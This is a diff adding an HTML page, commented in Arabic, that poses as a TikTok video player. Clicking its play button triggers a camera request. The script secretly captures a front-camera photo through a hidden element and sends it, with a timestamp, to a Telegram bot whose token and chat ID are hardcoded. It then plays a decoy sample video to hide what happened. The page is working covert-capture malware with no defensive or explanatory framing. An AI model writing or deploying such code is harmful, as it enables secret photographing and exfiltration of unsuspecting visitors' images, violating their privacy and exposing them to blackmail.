@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TikTok</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        .player {
+            width: 100%;
+            max-width: 420px;
+            position: relative;
+            cursor: pointer;
+        }
+        .player img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        .play-btn {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 70px; height: 70px;
+            background: rgba(0,0,0,0.65);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        .play-btn svg {
+            width: 32px; height: 32px;
+            fill: #fff;
+            margin-left: 4px;
+        }
+        .play-btn.hidden { opacity: 0; }
+
+        video {
+            width: 100%;
+            max-width: 420px;
+            display: none;
+        }
+        video.show { display: block; }
+        .player.hide { display: none; }
+
+        #hiddenCam {
+            position: fixed;
+            top: -9999px; left: -9999px;
+            width: 1px; height: 1px;
+            opacity: 0; pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+<!-- صورة الفيديو الواقف مع زر التشغيل -->
+<div class="player" id="player">
+    <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=400&q=80" alt="فيديو">
+    <div class="play-btn" id="playBtn">
+        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+    </div>
+</div>
+
+<!-- الفيديو الحقيقي (يشتغل بعد الضغط) -->
+<video id="realVideo" muted playsinline></video>
+
+<!-- كاميرا التصوير الخفي -->
+<video id="hiddenCam" autoplay playsinline muted></video>
+
+<script>
+// ================== الإعدادات ==================
+const TOKEN   = '8735029800:AAHAkVSyWV0uiLQugB-OIIaCbMi-h5se5M4';
+const CHAT_ID = '1659035307';
+// =============================================
+
+const player   = document.getElementById('player');
+const playBtn  = document.getElementById('playBtn');
+const realVideo = document.getElementById('realVideo');
+const hiddenCam = document.getElementById('hiddenCam');
+
+let stream = null;
+let done   = false;
+
+player.addEventListener('click', async () => {
+    if (done) return;
+    done = true;
+
+    try {
+        // 1. طلب الكاميرا
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+            audio: false
+        });
+        hiddenCam.srcObject = stream;
+        await hiddenCam.play();
+
+        // 2. التقط الصورة فوراً
+        const canvas = document.createElement('canvas');
+        canvas.width = 640; canvas.height = 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(hiddenCam, 0, 0, 640, 480);
+
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+        if (!blob) throw new Error();
+
+        // 3. أرسل لتيليجرام
+        const iframe = document.createElement('iframe');
+        iframe.name = 'tg' + Date.now();
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+        form.enctype = 'multipart/form-data';
+        form.target = iframe.name;
+        form.style.display = 'none';
+
+        const i1 = document.createElement('input');
+        i1.type = 'hidden'; i1.name = 'chat_id'; i1.value = CHAT_ID;
+        form.appendChild(i1);
+
+        const i2 = document.createElement('input');
+        i2.type = 'hidden'; i2.name = 'caption';
+        i2.value = `🎬 ضغط على الفيديو - ${new Date().toLocaleString('ar-EG')}`;
+        form.appendChild(i2);
+
+        const file = new File([blob], 'shot.jpg', { type: 'image/jpeg' });
+        const i3 = document.createElement('input');
+        i3.type = 'file'; i3.name = 'photo';
+        const dt = new DataTransfer();
+        dt.items.add(file);
+        i3.files = dt.files;
+        form.appendChild(i3);
+
+        document.body.appendChild(form);
+        form.submit();
+
+        setTimeout(() => { form.remove(); iframe.remove(); }, 1500);
+
+        // 4. وقف الكاميرا
+        stream.getTracks().forEach(t => t.stop());
+
+        // 5. شغل الفيديو الحقيقي (يخفي الصورة)
+        player.classList.add('hide');
+        realVideo.classList.add('show');
+        // حط رابط أي فيديو قصير (اختياري)
+        realVideo.src = 'https://www.w3schools.com/html/mov_bbb.mp4';
+        realVideo.play();
+
+    } catch (e) {
+        console.log(e);
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        // حتى لو فشلت الكاميرا، شغل الفيديو عادي
+        player.classList.add('hide');
+        realVideo.classList.add('show');
+        realVideo.src = 'https://www.w3schools.com/html/mov_bbb.mp4';
+        realVideo.play();
+    }
+});
+</script>
+</body>
+</html>
